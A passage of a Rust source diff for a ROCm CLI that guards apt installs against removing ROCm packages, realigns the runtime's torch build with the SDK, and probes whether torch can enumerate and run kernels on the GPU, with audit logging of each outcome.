+            // "Surface" is the exact claim, and it is not the same as failing the
+            // command: this error propagates out of the engine auto-install, and
+            // `finish_sdk_install` routes it through
+            // `engine_auto_install_failure_is_fatal`, which matches only
+            // `UnusableRuntimeAfterInstall`. So `rocm install sdk` still prints
+            // the failure and exits 0. Said here because the downgrade happens
+            // far away and reads as a non-zero exit from this site alone.
+            if escalate_failure {
                 return Err(error.context(
                     "OpenMPI install approved with --yes failed; rerun the commands above manually or retry without --yes to continue without OpenMPI",
                 ));
@@ -6905,7 +9429,11 @@ fn ensure_torch_runtime_dep(approved: bool, dep: &TorchRuntimeDep) {
     }
 
     let can_autoinstall = rocm_core::openmpi::can_autoinstall();
-    if !approved && !can_autoinstall {
+    // `escalate_failure` is deliberately ignored here: a missing libatomic/libnuma
+    // only warns, whatever approved the attempt.
+    let SystemPackageInstallAction::RunPlan { approval, .. } =
+        system_package_install_action(approved, can_autoinstall)
+    else {
         for check in &plan.preflight_checks {
             println!("  preflight: {check}");
         }
@@ -6917,16 +9445,9 @@ fn ensure_torch_runtime_dep(approved: bool, dep: &TorchRuntimeDep) {
             "warning: passwordless sudo is unavailable; run the commands above manually, or rerun with --yes to approve an interactive sudo prompt"
         );
         return;
-    }
+    };
 
-    println!(
-        "  approval: {}",
-        if approved {
-            "granted by --yes"
-        } else {
-            "auto (root or passwordless sudo available)"
-        }
-    );
+    println!("  approval: {approval}");
     match run_system_package_install_plan(&plan) {
         Ok(()) => {
             if (dep.present)() {
@@ -6948,6 +9469,70 @@ fn ensure_torch_runtime_dep(approved: bool, dep: &TorchRuntimeDep) {
     }
 }
 
+/// Refuse an `apt-get install` step that would remove ROCm/AMDGPU packages.
+///
+/// `apt-get install -y` assumes yes for *removals* as well as installs, so a
+/// dependency solution that evicts the ROCm stack would otherwise be applied
+/// unattended (this runs automatically under `rocm install sdk` whenever root or
+/// passwordless sudo is available). Simulating first turns that silent breakage
+/// into an actionable error naming every package at risk.
+///
+/// Only apt is gated: the dnf/zypper/pacman plans install additive runtime
+/// packages and have no equivalent assume-yes removal path. A simulation that
+/// cannot be run (apt missing, transient failure) is not treated as a refusal —
+/// the real command reports the failure with better context.
+fn ensure_apt_install_preserves_rocm(argv: &[String]) -> Result<()> {
+    let Some(simulate_argv) = rocm_core::openmpi::apt_simulate_argv(argv) else {
+        return Ok(());
+    };
+    let (program, args) = simulate_argv
+        .split_first()
+        .context("apt simulation has no program to run")?;
+    let Ok(output) = ProcessCommand::new(program)
+        .args(args)
+        .stdin(Stdio::null())
+        .output()
+    else {
+        return Ok(());
+    };
+    if !output.status.success() {
+        return Ok(());
+    }
+
+    let removals =
+        rocm_core::openmpi::parse_apt_simulate_removals(&String::from_utf8_lossy(&output.stdout));
+    let protected: Vec<&String> = removals
+        .iter()
+        .filter(|package| rocm_core::openmpi::is_protected_rocm_package(package))
+        .collect();
+    if protected.is_empty() {
+        return Ok(());
+    }
+
+    let rendered = |packages: &[&String]| {
+        packages
+            .iter()
+            .map(|package| package.as_str())
+            .collect::<Vec<_>>()
+            .join(", ")
+    };
+    let others: Vec<&String> = removals
+        .iter()
+        .filter(|package| !rocm_core::openmpi::is_protected_rocm_package(package))
+        .collect();
+    let other_detail = if others.is_empty() {
+        String::new()
+    } else {
+        format!("\n  other packages it would remove: {}", rendered(&others))
+    };
+    bail!(
+        "refusing to run `{}`: it would remove ROCm packages and break this installation\n  ROCm packages it would remove: {}{}\n  action: install the dependency manually after resolving the conflict (for example with a package version that does not evict ROCm), then rerun",
+        argv.join(" "),
+        rendered(&protected),
+        other_detail
+    );
+}
+
 fn run_system_package_install_plan(
     plan: &rocm_core::openmpi::SystemPackageInstallPlan,
 ) -> Result<()> {
@@ -6957,6 +9542,8 @@ fn run_system_package_install_plan(
         // are not already root (where `sudo` may be absent); the argv runs
         // directly without a shell.
         let argv = command.resolved_argv(root);
+        // Never let an automatic dependency install evict the ROCm stack.
+        ensure_apt_install_preserves_rocm(&argv)?;
         // Inherit stdin so an interactive `sudo` password prompt (the case the
         // `--yes` approval exists for) can be answered. When already root or
         // passwordless sudo is configured, sudo does not prompt and the inherited
@@ -6988,7 +9575,7 @@ fn maybe_auto_install_sdk_preferred_engine(
 
     let mut config = RocmCliConfig::load(paths)?;
     let env_root = env_root_for_engine_install(paths, &config, engine, &finalized.runtime_key)?;
-    let response = engine_request_with_env_root::<_, InstallResponse>(
+    let response = match engine_request_with_env_root::<_, InstallResponse>(
         Some(paths),
         engine,
         EngineMethod::Install,
@@ -6999,11 +9586,30 @@ fn maybe_auto_install_sdk_preferred_engine(
             env_root: env_root.clone(),
         },
         env_root.as_deref(),
-    )?;
+    ) {
+        Ok(response) => response,
+        Err(error) => {
+            // A failed engine install is the case most likely to leave the SDK's torch
+            // sitting over the engine's pin, because the install is what would have
+            // restored it. Reporting the check only on success would print nothing here
+            // — and `install sdk` still exits 0 — which is exactly the silent broken
+            // runtime this block exists to prevent.
+            report_engine_dependency_check(
+                paths,
+                engine,
+                runtime_python_for_key(paths, &finalized.runtime_key).as_deref(),
+                &finalized.runtime_key,
+                // The engine install failed, so no alignment ran and any
+                // divergence found here is a real one.
+                None,
+            );
+            return Err(error);
+        }
+    };
     println!("  reinstall: false");
     println!("  env_id: {}", response.env_id);
     println!("  env_path: {}", response.env_path);
-    for warning in response.warnings {
+    for warning in &response.warnings {
         println!("  warning: {warning}");
     }
 
@@ -7018,6 +9624,8 @@ fn maybe_auto_install_sdk_preferred_engine(
             engine_config.preferred_env_id = Some(response.env_id.clone());
         }
         config.save(paths)?;
+
+        settle_engine_install(paths, engine, &finalized.runtime_key, &response)?;
     }
 
     record_cli_audit_event(
@@ -7034,12 +9642,1306 @@ fn maybe_auto_install_sdk_preferred_engine(
     Ok(())
 }
 
+/// Whether an installed engine's declared requirements are met in the environment it
+/// shares with the ROCm SDK.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum EngineDependencyCheck {
+    /// Every requirement the engine declares is satisfied.
+    Satisfied,
+    /// The engine declares requirements the environment does not meet, one line each,
+    /// as the resolver reported them.
+    ///
+    /// `expected` carries any divergence the install made on purpose that shares the
+    /// run with a genuine violation. It is reported separately rather than folded in
+    /// because the remedy differs: reinstalling the engine repairs `violations` and
+    /// destroys `expected`, so naming that remedy is only safe while `expected` is
+    /// empty.
+    Violated {
+        violations: Vec<String>,
+        expected: Vec<String>,
+    },
+    /// The only unmet requirements are ones the install deliberately diverged from.
+    ///
+    /// Torch alignment leaves the runtime holding the SDK's build of the release
+    /// the engine pins, which the engine's exact-pin metadata cannot express. The
+    /// distinction matters because the remedy for a real violation — reinstalling
+    /// the engine — is precisely what would undo the alignment and restore a
+    /// runtime that cannot open a device.
+    ExpectedDivergence(Vec<String>),
+    /// The check itself could not run (no usable `uv`, unreadable environment).
+    NotVerified(String),
+}
+
+/// Print the dependency check for `engine` and record it in the CLI audit log.
+///
+/// A surviving violation does not fail the install: the SDK itself installed correctly,
+/// and abandoning a multi-gigabyte install would cost the user more than the warning and
+/// the one-line remedy it names.
+fn report_engine_dependency_check(
+    paths: &AppPaths,
+    engine: &str,
+    python: Option<&Path>,
+    runtime_key: &str,
+    realigned_package: Option<&str>,
+) {
+    let outcome = engine_dependency_check(paths, engine, python, realigned_package);
+    print!("{}", render_engine_dependency_check(engine, &outcome));
+    let (level, message) = match &outcome {
+        EngineDependencyCheck::Satisfied => (
+            "info",
+            format!("engine={engine} runtime_id={runtime_key} dependency_check=satisfied"),
+        ),
+        EngineDependencyCheck::Violated {
+            violations,
+            expected,
+        } => (
+            "error",
+            format!(
+                "engine={engine} runtime_id={runtime_key} dependency_check=violated: {}{}",
+                violations.join("; "),
+                if expected.is_empty() {
+                    String::new()
+                } else {
+                    format!(" (expected_divergence: {})", expected.join("; "))
+                }
+            ),
+        ),
+        EngineDependencyCheck::ExpectedDivergence(details) => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} dependency_check=expected_divergence: {}",
+                details.join("; ")
+            ),
+        ),
+        EngineDependencyCheck::NotVerified(reason) => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} dependency_check=not_verified: {reason}"
+            ),
+        ),
+    };
+    record_cli_audit_event(
+        paths,
+        "engine",
+        "engine_dependency_check",
+        level,
+        message,
+        None,
+    );
+}
+
+/// The Python interpreter of the managed runtime `runtime_key`, when its manifest names
+/// one. Used to check an environment whose engine install did not get far enough to
+/// report its own interpreter.
+fn runtime_python_for_key(paths: &AppPaths, runtime_key: &str) -> Option<PathBuf> {
+    let manifests = therock::load_runtime_manifests(paths).ok()?;
+    let manifest = runtime_manifest_for_selector(&manifests, runtime_key)?;
+    manifest.python_executable.as_deref().map(PathBuf::from)
+}
+
+/// The runtime's recorded ROCm library directories.
+///
+/// These are what a served process gets on its loader path, so a probe must use
+/// them too or it will judge a healthy runtime unusable.
+fn runtime_library_paths_for_key(paths: &AppPaths, runtime_key: &str) -> Vec<PathBuf> {
+    let Ok(manifests) = therock::load_runtime_manifests(paths) else {
+        return Vec::new();
+    };
+    runtime_manifest_for_selector(&manifests, runtime_key)
+        .and_then(|manifest| manifest.rocm_sdk.as_ref())
+        .map(|probe| probe.library_paths.clone())
+        .unwrap_or_default()
+}
+
+/// The wheel index the runtime was installed from.
+fn runtime_index_url_for_key(paths: &AppPaths, runtime_key: &str) -> Option<String> {
+    let manifests = therock::load_runtime_manifests(paths).ok()?;
+    let manifest = runtime_manifest_for_selector(&manifests, runtime_key)?;
+    manifest.index_url.clone()
+}
+
+/// Which torch a runtime should hold once an engine has been installed into it.
+///
+/// Two installers write torch into the same environment. The SDK install writes
+/// TheRock's build; the engine then writes the build from its own index, pinned
+/// to an exact version. Letting either side win unconditionally is wrong, and
+/// both failures have been observed in the field:
+///
+/// * If the engine's build always wins, the runtime can end up with a torch that
+///   loads against the installed SDK and then enumerates no devices, so serving
+///   fails with an unhelpful error long after the install reported success.
+/// * If the SDK's build always wins, the runtime can end up on a torch that
+///   enumerates a device and still has no kernel image for this exact target,
+///   failing on the first tensor operation instead.
+///
+/// So compatibility is tested rather than assumed. A torch already executing a
+/// GPU kernel with this SDK is kept exactly as it is — that decision is
+/// `TorchRetention`, and it runs first. This alignment is the repair for
+/// everything else, and what it installs is the SDK's *build* of the *release*
+/// the engine pins: the release comes from the engine, which is built against it,
+/// and the build comes from the SDK, which the libraries belong to.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum TorchAlignment {
+    /// The runtime already holds the SDK build of the engine's torch release.
+    AlreadyAligned { version: String },
+    /// The engine's build was replaced with the SDK build of the same release.
+    Realigned { from: String, to: String },
+    /// The SDK publishes no build of that release; the engine's own is kept.
+    ///
+    /// Claimed only when the resolver actually said so. Any other failure is an
+    /// `InstallFailed`, because asserting "not published" over a network or disk
+    /// error sends the reader hunting for a missing wheel that exists.
+    Unavailable { wanted: String, kept: String },
+    /// The realignment install failed for some other reason, carried verbatim.
+    InstallFailed {
+        wanted: String,
+        kept: String,
+        error: String,
+    },
+    /// The user opted out, and a replacement was due: their torch is kept.
+    ///
+    /// Distinct from every other outcome because nothing was attempted. Reading
+    /// it as `NotApplicable` would say the rule had no opinion, when it had one
+    /// and was told not to act on it, and that difference is what the reader
+    /// needs: `wanted` is the build that was not installed, `kept` the one still
+    /// there. Only reachable when those two actually differ, so a runtime the
+    /// opt-out changed nothing about is never described as one it spared.
+    Disabled { wanted: String, kept: String },
+    /// Nothing to decide — no exact pin, no engine metadata, or no SDK torch.
+    NotApplicable(String),
+}
+
+/// What the alignment rule concludes, before any of it is acted on.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum TorchAlignmentPlan {
+    AlreadyAligned { version: String },
+    Install { wanted: String, from: String },
+    NotApplicable(String),
+}
+
+/// The rule itself, kept free of I/O so both field failures can be tested.
+///
+/// `wanted` is the engine's pinned *release* carrying the SDK's *build*.
+fn plan_torch_alignment(
+    sdk_build: Option<&str>,
+    installed_torch: Option<&str>,
+    engine_requirement: Option<&str>,
+    engine: &str,
+) -> TorchAlignmentPlan {
+    let Some(sdk_build) = sdk_build else {
+        return TorchAlignmentPlan::NotApplicable(
+            "the runtime manifest does not identify the SDK's torch build".to_owned(),
+        );
+    };
+    let Some(requirement) = engine_requirement else {
+        return TorchAlignmentPlan::NotApplicable(format!("{engine} does not pin torch"));
+    };
+    let Some(pinned) = therock::requirement_pinned_version(requirement) else {
+        return TorchAlignmentPlan::NotApplicable(format!(
+            "{engine} does not pin torch to an exact version ({requirement})"
+        ));
+    };
+    let wanted = format!("{}+{sdk_build}", therock::split_local_version(pinned).0);
+    let installed = installed_torch.unwrap_or_default().to_owned();
+    if installed == wanted {
+        TorchAlignmentPlan::AlreadyAligned { version: wanted }
+    } else {
+        TorchAlignmentPlan::Install {
+            wanted,
+            from: installed,
+        }
+    }
+}
+
+/// Whether a failed install means the resolver could not find that version.
+///
+/// Deliberately narrow. Anything unmatched is reported as a plain failure with
+/// its error, so an unrecognised message degrades to the honest answer rather
+/// than to a confident wrong one.
+fn install_error_reports_version_unavailable(error: &str) -> bool {
+    let error = error.to_ascii_lowercase();
+    error.contains("no solution found")
+        || error.contains("were found for")
+        || error.contains("not found in the package registry")
+        || error.contains("has no version")
+}
+
+/// Whether the user has opted out of realigning torch.
+///
+/// The alignment rewrites a package the user may have installed deliberately, and
+/// it runs on every path that installs an engine, so a hand-installed torch is
+/// otherwise replaced again by the next `engines install`, `install sdk`, or
+/// `engines shell`. The stack this resolves to — the SDK's build of the release
+/// the engine pins — is not validated against the supported matrix, so "the SDK's
+/// build does not work on this machine" is a case that can happen rather than a
+/// hypothetical one, and it needs an exit that is not "stop using the CLI".
+///
+/// The engine reads the same variable through the same helper, so the two sides
+/// cannot drift; [`rocm_core::torch_alignment_disabled`] carries why that matters.
+/// Suppressing the correction does not suppress the diagnosis: a runtime that
+/// opens no device or cannot run a kernel on one is still reported as such — and
+/// still fails the install on a host where a GPU was found.
+fn torch_alignment_disabled() -> bool {
+    rocm_core::torch_alignment_disabled()
+}
+
+/// Install the SDK's build of the release the engine pins, when that is needed.
+///
+/// `torch` is the metadata probe the caller already took: the retention decision
+/// that runs first needs the engine's pin too, and asking the runtime the same
+/// question twice would be a second interpreter launch for an answer in hand.
+///
+/// The opt-out is read where the install would run, not at the top. That is the
+/// only place it changes anything, and reading it there is what lets the result
+/// name the replacement it declined to make: a runtime with no replacement due
+/// reports what it is, rather than reporting an opt-out that skipped nothing.
+fn align_runtime_torch(
+    paths: &AppPaths,
+    python: &Path,
+    index_url: Option<&str>,
+    sdk_build: Option<&str>,
+    engine: &str,
+    torch: Result<&therock::TorchAlignmentProbe, &anyhow::Error>,
+) -> TorchAlignment {
+    let probe = match torch {
+        Ok(probe) => probe,
+        Err(error) => return TorchAlignment::NotApplicable(error.to_string()),
+    };
+    let plan = plan_torch_alignment(
+        sdk_build,
+        probe.installed_torch.as_deref(),
+        probe.engine_requires_torch.as_deref(),
+        engine,
+    );
+    let (wanted, from) = match plan {
+        TorchAlignmentPlan::AlreadyAligned { version } => {
+            return TorchAlignment::AlreadyAligned { version };
+        }
+        TorchAlignmentPlan::NotApplicable(reason) => {
+            return TorchAlignment::NotApplicable(reason);
+        }
+        TorchAlignmentPlan::Install { wanted, from } => (wanted, from),
+    };
+    // Read only now that a replacement is actually due, so the opt-out reports
+    // the install it stopped rather than standing in for a runtime that needed
+    // nothing. Everything after this point is the rewrite itself.
+    if torch_alignment_disabled() {
+        return TorchAlignment::Disabled { wanted, kept: from };
+    }
+    let Some(index_url) = index_url else {
+        return TorchAlignment::NotApplicable(
+            "the runtime manifest records no wheel index to install from".to_owned(),
+        );
+    };
+    match therock::install_pinned_package(
+        paths,
+        python,
+        index_url,
+        "torch",
+        &format!("torch=={wanted}"),
+    ) {
+        Ok(()) => TorchAlignment::Realigned { from, to: wanted },
+        // The SDK index may not publish this release at all. That is a real
+        // possibility, not an error to abort on: the engine's own build is left
+        // in place and the device check that follows reports whether it works.
+        Err(error) => {
+            let error = format!("{error:#}");
+            if install_error_reports_version_unavailable(&error) {
+                TorchAlignment::Unavailable { wanted, kept: from }
+            } else {
+                TorchAlignment::InstallFailed {
+                    wanted,
+                    kept: from,
+                    error,
+                }
+            }
+        }
+    }
+}
+
+/// Render one alignment outcome as the `torch_alignment:` check block.
+///
+/// `engine` names the engine whose pin decided the release, so the realigned line
+/// reads `... the release vllm pins` rather than an anonymous "the engine". It
+/// arrives from the engine selection and is sanitized like every other
+/// interpolated value.
+///
+/// `before` is the verdict the runtime gave *prior* to the realignment. Only the
+/// realigned outcome replaced anything, so only that arm prints it — and it must,
+/// because the `device_check:` block further down reports the runtime as it is
+/// now. Without the before verdict beside it, a realignment that ends in a
+/// failing runtime does not say whether the alignment broke something that
+/// worked or found something already broken, and answering that afterwards means
+/// going to the machine to look. The value is already in hand at the call site;
+/// dropping it only moves the cost onto whoever reads the output.
+fn render_torch_alignment(
+    outcome: &TorchAlignment,
+    engine: &str,
+    before: Option<&RuntimeDeviceCheck>,
+) -> String {
+    let mut output = String::new();
+    match outcome {
+        TorchAlignment::AlreadyAligned { version } => {
+            let _ = writeln!(
+                output,
+                "  torch_alignment: already_aligned ({})",
+                sanitize_log_value(version)
+            );
+        }
+        TorchAlignment::Realigned { from, to } => {
+            let _ = writeln!(output, "  torch_alignment: realigned");
+            let _ = writeln!(
+                output,
+                "    {} -> {} (the SDK's build of the release {} pins)",
+                sanitize_log_value(from),
+                sanitize_log_value(to),
+                sanitize_log_value(engine)
+            );
+            if let Some(before) = before {
+                let _ = writeln!(
+                    output,
+                    "    before this replacement: {} (device_check below is after it)",
+                    sanitize_log_value(&device_check_verdict(before))
+                );
+            }
+        }
+        TorchAlignment::Unavailable { wanted, kept } => {
+            let _ = writeln!(output, "  torch_alignment: unavailable");
+            let _ = writeln!(
+                output,
+                "    the SDK index publishes no {}; keeping {}",
+                sanitize_log_value(wanted),
+                sanitize_log_value(kept)
+            );
+        }
+        TorchAlignment::InstallFailed {
+            wanted,
+            kept,
+            error,
+        } => {
+            let _ = writeln!(output, "  torch_alignment: install_failed");
+            let _ = writeln!(
+                output,
+                "    could not install {}: {}",
+                sanitize_log_value(wanted),
+                sanitize_log_value(error)
+            );
+            let _ = writeln!(output, "    keeping {}", sanitize_log_value(kept));
+        }
+        TorchAlignment::Disabled { wanted, kept } => {
+            let _ = writeln!(output, "  torch_alignment: disabled");
+            let _ = writeln!(
+                output,
+                "    ROCM_CLI_DISABLE_TORCH_ALIGNMENT is set; keeping {} rather than installing {}",
+                sanitize_log_value(kept),
+                sanitize_log_value(wanted)
+            );
+        }
+        TorchAlignment::NotApplicable(reason) => {
+            let _ = writeln!(
+                output,
+                "  torch_alignment: not_applicable ({})",
+                sanitize_log_value(reason)
+            );
+        }
+    }
+    output
+}
+
+/// Repair the runtime's torch, print the `torch_alignment:` block, and record it.
+///
+/// Reached only when no torch in the runtime has proven it can run a GPU kernel.
+/// The outcome is returned so the dependency check that follows can be read
+/// against it: `deliberately_diverged_package` turns it into the one package
+/// whose divergence is intended.
+fn report_torch_alignment(
+    paths: &AppPaths,
+    engine: &str,
+    python: &Path,
+    runtime_key: &str,
+    sdk_build: Option<&str>,
+    torch: Result<&therock::TorchAlignmentProbe, &anyhow::Error>,
+    before: &RuntimeDeviceCheck,
+) -> TorchAlignment {
+    let index_url = runtime_index_url_for_key(paths, runtime_key);
+    let outcome = align_runtime_torch(
+        paths,
+        python,
+        index_url.as_deref(),
+        sdk_build,
+        engine,
+        torch,
+    );
+    print!("{}", render_torch_alignment(&outcome, engine, Some(before)));
+    let (level, message) = match &outcome {
+        TorchAlignment::AlreadyAligned { version } => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} torch_alignment=already_aligned version={version}"
+            ),
+        ),
+        // The before verdict rides along in the audit line too: the log is read
+        // long after the install, when the runtime on disk can no longer answer
+        // what it was like beforehand.
+        TorchAlignment::Realigned { from, to } => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} torch_alignment=realigned from={from} to={to} before={}",
+                device_check_verdict(before)
+            ),
+        ),
+        TorchAlignment::Unavailable { wanted, kept } => (
+            "error",
+            format!(
+                "engine={engine} runtime_id={runtime_key} torch_alignment=unavailable wanted={wanted} kept={kept}"
+            ),
+        ),
+        TorchAlignment::InstallFailed {
+            wanted,
+            kept,
+            error,
+        } => (
+            "error",
+            format!(
+                "engine={engine} runtime_id={runtime_key} torch_alignment=install_failed wanted={wanted} kept={kept}: {error}"
+            ),
+        ),
+        // The user's own decision, carried out as asked, so it is not an error.
+        // The device check that follows is what says whether the torch they kept
+        // works, and that verdict is recorded — and enforced — on its own.
+        TorchAlignment::Disabled { wanted, kept } => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} torch_alignment=disabled kept={kept} wanted={wanted}"
+            ),
+        ),
+        TorchAlignment::NotApplicable(reason) => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} torch_alignment=not_applicable: {reason}"
+            ),
+        ),
+    };
+    record_cli_audit_event(paths, "engine", "torch_alignment", level, message, None);
+    outcome
+}
+
+/// The package the runtime now deliberately diverges on, if any, so the
+/// dependency check can tell that divergence apart from a real violation.
+///
+/// Both `Realigned` and `AlreadyAligned` diverge from the engine's exact pin —
+/// the second is a rerun over a runtime already put right, which is the normal
+/// state on every refresh after the first.
+///
+/// `Disabled` counts for the same reason, from the other direction: the torch
+/// that does not satisfy the pin is the one the user told us to leave alone, so
+/// reporting it as a violation would answer their instruction with an error and
+/// a `--reinstall` remedy that would undo it. It is only ever constructed over a
+/// real mismatch, so this never suppresses a divergence that is not there.
+///
+/// `Unavailable` and `InstallFailed` stay excluded. Nothing was replaced there
+/// either, but nothing was intended either — the repair was attempted and did
+/// not happen — so whatever the dependency check finds is a real finding.
+const fn deliberately_diverged_package(outcome: &TorchAlignment) -> Option<&'static str> {
+    match outcome {
+        TorchAlignment::Realigned { .. }
+        | TorchAlignment::AlreadyAligned { .. }
+        | TorchAlignment::Disabled { .. } => Some("torch"),
+        TorchAlignment::Unavailable { .. }
+        | TorchAlignment::InstallFailed { .. }
+        | TorchAlignment::NotApplicable(_) => None,
+    }
+}
+
+/// Whether the installed runtime can actually run work on a GPU.
+///
+/// The dependency check answers whether the engine's declared requirements are
+/// satisfied. That is a question about metadata, and it is not the same question
+/// as whether the environment works. Two distinct answers matter here, because a
+/// torch can fail at either step: one built against a different ROCm version than
+/// the installed SDK loads cleanly and then reports no devices, which vLLM turns
+/// into `Failed to infer device type` at first serve; one built without a kernel
+/// image for this target reports a device and then dies on the first tensor
+/// operation. Only a torch that gets past both has been shown to work.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum RuntimeDeviceCheck {
+    /// torch imported and reported at least one device.
+    Usable {
+        device_count: u32,
+        torch_version: String,
+    },
+    /// torch imported but reported no devices — a torch built for another SDK.
+    NoDevices {
+        torch_version: String,
+        hip_version: String,
+    },
+    /// torch found a device and then could not execute a kernel on it.
+    ///
+    /// Distinct from `NoDevices` because the remedy is different: the runtime is
+    /// not looking at the wrong SDK, it is holding a build with no code for this
+    /// GPU.
+    KernelFailed {
+        torch_version: String,
+        error: String,
+    },
+    /// The question could not be answered — including when torch does not import.
+    ///
+    /// Never a reason to assume healthy, but on its own never fatal either: see
+    /// `install_left_runtime_unusable`, which acts only on the verdicts where the
+    /// runtime was asked and answered badly. This variant covers benign causes as
+    /// well as real ones — a runtime whose Python could not be located, or a probe
+    /// that could not launch — and failing a multi-gigabyte install because a
+    /// probe did not run is worse than reporting what was and was not seen. The
+    /// cost is that a runtime whose torch is present but unimportable is reported
+    /// rather than failed.
+    NotVerified(String),
+}
+
+fn runtime_device_check(python: Option<&Path>, library_paths: &[PathBuf]) -> RuntimeDeviceCheck {
+    let Some(python) = python else {
+        return RuntimeDeviceCheck::NotVerified(
+            "the runtime's Python environment could not be located".to_owned(),
+        );
+    };
+    match therock::probe_runtime_devices(python, library_paths) {
+        Ok(probe) => classify_runtime_device_probe(probe),
+        Err(error) => RuntimeDeviceCheck::NotVerified(error.to_string()),
+    }
+}
+
+/// Read one probe as a verdict, kept free of I/O so every state can be tested.
+fn classify_runtime_device_probe(probe: therock::RuntimeDeviceProbe) -> RuntimeDeviceCheck {
+    if !probe.import_ok {
+        return RuntimeDeviceCheck::NotVerified(
+            probe
+                .error
+                .unwrap_or_else(|| "torch did not import".to_owned()),
+        );
+    }
+    let torch_version = probe.torch_version.unwrap_or_else(|| "unknown".to_owned());
+    // A kernel that would not launch is definitive, so it is read before the
+    // count and never dropped: the probe only reaches that step after it has
+    // already enumerated a device, and the count alone would read as healthy.
+    if let Some(error) = probe.kernel_error {
+        return RuntimeDeviceCheck::KernelFailed {
+            torch_version,
+            error,
+        };
+    }
+    match probe.device_count {
+        Some(0) => RuntimeDeviceCheck::NoDevices {
+            torch_version,
+            hip_version: probe.hip_version.unwrap_or_else(|| "unknown".to_owned()),
+        },
+        Some(device_count) => RuntimeDeviceCheck::Usable {
+            device_count,
+            torch_version,
+        },
+        // A `device_count()` that raises — HIP init failures are the live example —
+        // reports no count and puts the real exception in `error`. That exception is
+        // precisely the diagnostic this probe exists to capture, so prefer it over
+        // the generic line, which is only right when the probe returned nothing at
+        // all to explain itself.
+        None => RuntimeDeviceCheck::NotVerified(
+            probe
+                .error
+                .unwrap_or_else(|| "torch imported but did not report a device count".to_owned()),
+        ),
+    }
+}
+
+/// One device-check verdict on one line, for quoting inside another block.
+///
+/// The full block explains the verdict and names a consequence, which is right
+/// where it is the answer and wrong where it is context for something else. This
+/// keeps the part that identifies the verdict — the name and the torch it was
+/// asked about — so a before/after pair reads as a pair rather than as two
+/// competing diagnoses.
+fn device_check_verdict(outcome: &RuntimeDeviceCheck) -> String {
+    match outcome {
+        RuntimeDeviceCheck::Usable {
+            device_count,
+            torch_version,
+        } => format!("usable ({device_count} device(s), torch {torch_version})"),
+        RuntimeDeviceCheck::NoDevices { torch_version, .. } => {
+            format!("no_devices (torch {torch_version})")
+        }
+        RuntimeDeviceCheck::KernelFailed { torch_version, .. } => {
+            format!("kernel_failed (torch {torch_version})")
+        }
+        RuntimeDeviceCheck::NotVerified(reason) => format!("not_verified ({reason})"),
+    }
+}
+
+fn render_runtime_device_check(outcome: &RuntimeDeviceCheck) -> String {
+    let mut output = String::new();
+    match outcome {
+        RuntimeDeviceCheck::Usable {
+            device_count,
+            torch_version,
+        } => {
+            let _ = writeln!(
+                output,
+                "  device_check: usable ({device_count} device(s), torch {})",
+                sanitize_log_value(torch_version)
+            );
+        }
+        RuntimeDeviceCheck::NotVerified(reason) => {
+            let _ = writeln!(
+                output,
+                "  device_check: not_verified ({})",
+                sanitize_log_value(reason)
+            );
+        }
+        RuntimeDeviceCheck::NoDevices {
+            torch_version,
+            hip_version,
+        } => {
+            let _ = writeln!(output, "  device_check: no_devices");
+            let _ = writeln!(
+                output,
+                "    torch {} (hip {}) imported but reports 0 devices",
+                sanitize_log_value(torch_version),
+                sanitize_log_value(hip_version)
+            );
+            // Deliberately no remedy: the reinstall that would satisfy the
+            // engine's pin is what produces this state, so naming it here would
+            // send people in a circle. Say what is wrong and let them choose.
+            let _ = writeln!(
+                output,
+                "    serving will fail with `Failed to infer device type`; this torch is built \
+                 for a different ROCm version than the installed SDK"
+            );
+        }
+        RuntimeDeviceCheck::KernelFailed {
+            torch_version,
+            error,
+        } => {
+            let _ = writeln!(output, "  device_check: kernel_failed");
+            let _ = writeln!(
+                output,
+                "    torch {} found a GPU but could not run a kernel on it: {}",
+                sanitize_log_value(torch_version),
+                sanitize_log_value(error)
+            );
+            let _ = writeln!(
+                output,
+                "    serving will fail on the first tensor operation; this torch has no kernel \
+                 image for this GPU"
+            );
+        }
+    }
+    output
+}
+
+/// Print one device-check verdict and record it.
+///
+/// The verdict is taken as an argument because the settle path probes the runtime
+/// before it decides what to do with it, and the block is printed in its usual
+/// place afterwards rather than where the probe happened to run.
+fn report_runtime_device_check(
+    paths: &AppPaths,
+    engine: &str,
+    runtime_key: &str,
+    outcome: RuntimeDeviceCheck,
+) -> RuntimeDeviceCheck {
+    print!("{}", render_runtime_device_check(&outcome));
+    let (level, message) = match &outcome {
+        RuntimeDeviceCheck::Usable { device_count, .. } => (
+            "info",
+            format!(
+                "engine={engine} runtime_id={runtime_key} device_check=usable devices={device_count}"
+            ),
+        ),
+        RuntimeDeviceCheck::NoDevices {
+            torch_version,
+            hip_version,
+        } => (
+            "error",
+            format!(
+                "engine={engine} runtime_id={runtime_key} device_check=no_devices torch={torch_version} hip={hip_version}"
+            ),
+        ),
+        RuntimeDeviceCheck::KernelFailed {
+            torch_version,
+            error,
+        } => (
+            "error",
+            format!(
+                "engine={engine} runtime_id={runtime_key} device_check=kernel_failed torch={torch_version}: {error}"
+            ),
+        ),
+        RuntimeDeviceCheck::NotVerified(reason) => (
+            "info",
+            format!("engine={engine} runtime_id={runtime_key} device_check=not_verified: {reason}"),
+        ),
+    };
+    record_cli_audit_event(
+        paths,
+        "engine",
+        "runtime_device_check",
+        level,
+        message,
+        None,
+    );
+    outcome
+}
+
+/// The build identifier of the torch that belongs to this runtime's SDK.
+///
+/// Taken from the manifest, never from whatever torch happens to be installed.
+/// The environment tells you what is there now, which after an engine install is
+/// the engine's build — trusting that would let a runtime already holding the
+/// wrong torch declare itself correct and never recover.
+///
+/// Older manifests predate the recorded value, so fall back to deriving it from
+/// the SDK version, which is how TheRock names these builds.
+fn sdk_torch_build_for_key(paths: &AppPaths, runtime_key: &str) -> Option<String> {
+    let manifests = therock::load_runtime_manifests(paths).ok()?;
+    let manifest = runtime_manifest_for_selector(&manifests, runtime_key)?;
+    sdk_torch_build_from_manifest(manifest)
+}
+
+/// The build identifier one manifest names, with the fallback for older manifests.
+///
